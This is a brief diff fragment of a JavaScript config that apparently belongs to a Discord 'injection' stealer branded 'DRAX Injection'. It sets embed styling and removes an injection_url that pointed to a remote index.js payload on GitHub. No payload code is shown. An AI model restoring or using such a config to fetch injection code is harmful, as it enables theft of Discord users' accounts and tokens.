@@ -14,7 +14,7 @@ const config = {
   embed_name: 'DRAX Injection', 
   embed_icon: 'https://cdn.discordapp.com/avatars/740676427602591764/97b66df7f22b94192d051bfb87652c03.png?size=1024'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Shadow132245/injection33/main/injection/main/index.js', 
+  injection_url: '', 
   /**
    
    **/
